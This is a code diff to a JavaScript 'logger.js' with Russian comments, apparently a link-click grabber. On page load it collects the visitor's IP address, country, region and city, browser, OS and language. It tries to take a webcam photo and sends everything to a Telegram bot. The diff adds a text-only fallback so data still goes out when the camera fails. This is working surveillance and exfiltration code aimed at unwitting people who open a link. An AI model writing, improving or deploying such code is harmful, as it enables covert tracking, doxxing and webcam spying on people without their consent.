@@ -1,54 +1,79 @@
+// logger.js — ИСПРАВЛЕННАЯ ВЕРСИЯ
 (async function() {
     "use strict";
 
-    // ---------- 1. Сбор IP + геолокация ----------
+    // ========== 1. Сбор IP и геолокации ==========
     let ipAddress = "0.0.0.0";
-    let geo = "не определена";
+    let country = "не определена";
+    let region = "не определён";
+    let city = "не определён";
 
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         ipAddress = ipData.ip;
 
-        const geoRes = await fetch(`https://api.ipify.org?format=json`);
-        // используем ipapi.co для гео
         const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
         const geoData = await geoReq.json();
-        geo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
+        
+        country = geoData.country_name || "не определена";
+        region = geoData.region || "не определён";
+        city = geoData.city || "не определён";
     } catch(e) {
-        geo = "ошибка геолокации";
+        console.warn("Geo error:", e);
     }
 
-    // ---------- 2. Время перехода ----------
+    // ========== 2. Время перехода ==========
     const now = new Date();
     const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
 
-    // ---------- 3. UserAgent / устройство ----------
+    // ========== 3. UserAgent и язык ==========
     const userAgent = navigator.userAgent;
-    let deviceType = "не определено";
+    const language = navigator.language || "не определён";
     
+    let deviceType = "не определён";
     if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
         deviceType = "Телефон";
     } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
-        deviceType = "Пк";
+        deviceType = "Компьютер";
     }
-    
-    // Краткая версия UA (основные идентификаторы)
+
+    // ОС
+    let os = "не определена";
+    if (userAgent.includes("Windows")) os = "Windows";
+    else if (userAgent.includes("Android")) os = "Android";
+    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+    else if (userAgent.includes("Mac")) os = "MacOS";
+    else if (userAgent.includes("Linux")) os = "Linux";
+
+    // Браузер
+    let browser = "не определён";
+    if (userAgent.includes("Chrome")) browser = "Chrome";
+    else if (userAgent.includes("Firefox")) browser = "Firefox";
+    else if (userAgent.includes("Safari")) browser = "Safari";
+    else if (userAgent.includes("Edge")) browser = "Edge";
+    else if (userAgent.includes("Opera")) browser = "Opera";
+
+    // Краткий UserAgent
     let shortUA = userAgent;
-    if (userAgent.length > 100) {
-        shortUA = userAgent.substring(0, 97) + "...";
+    if (userAgent.length > 80) {
+        shortUA = userAgent.substring(0, 77) + "...";
     }
 
-    // ---------- 4. Формирование caption (древовидный стиль) ----------
-    const caption = `🚨Новый снимок с камеры!
-    
-🌍IP: ${ipAddress}
- ├─🕗Время: ${timeStr}
- └─🖥User-Agent: ${shortUA}
- 
-🌐Геолокация: ${geo}`;
+    // ========== 4. Формирование сообщения (БЕЗ КООРДИНАТ, ССЫЛКИ, РЕФЕРЕРА, FOXLOGGER) ==========
+    const caption = `🚨 НОВЫЙ ПЕРЕХОД ПО ССЫЛКЕ!
 
-    // ---------- 5. Захват фото с вебкамеры ----------
+🌐 IP: ${ipAddress}
+ ├─User-Agent: ${deviceType} | ${browser} | ${os}
+ ├─Язык: ${language}
+ └─Время: ${timeStr}
+
+🌍 Геолокация:
+ ├─Страна: ${country}
+ ├─Регион: ${region}
+ └─Город: ${city}`;
+
+    // ========== 5. Захват фото с вебкамеры ==========
     let photoBlob = null;
 
     try {
@@ -83,7 +108,7 @@
         photoBlob = null;
     }
 
-    // ---------- 6. Отправка в Telegram (фото + caption) ----------
+    // ========== 6. Отправка в Telegram ==========
     async function sendPhotoWithCaption(blob, captionText) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const formData = new FormData();
@@ -95,20 +120,31 @@
         return response.json();
     }
 
-    if (photoBlob) {
-        await sendPhotoWithCaption(photoBlob, caption);
-    } else {
-        // Если камера недоступна — ничего не отправляем (либо раскомментируйте ниже для текста)
-        /*
-        const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(textUrl, {
+    async function sendTextOnly(text) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: caption
+                text: text,
+                disable_web_page_preview: true
             })
         });
-        */
+        return response.json();
+    }
+
+    // Отправляем
+    if (photoBlob) {
+        const result = await sendPhotoWithCaption(photoBlob, caption);
+        if (result.ok) {
+            console.log("✅ Фото и данные отправлены");
+        } else {
+            console.log("❌ Ошибка отправки фото, отправляем текст");
+            await sendTextOnly(caption);
+        }
+    } else {
+        await sendTextOnly(caption);
+        console.log("✅ Текст отправлен (камера недоступна)");
     }
 })();
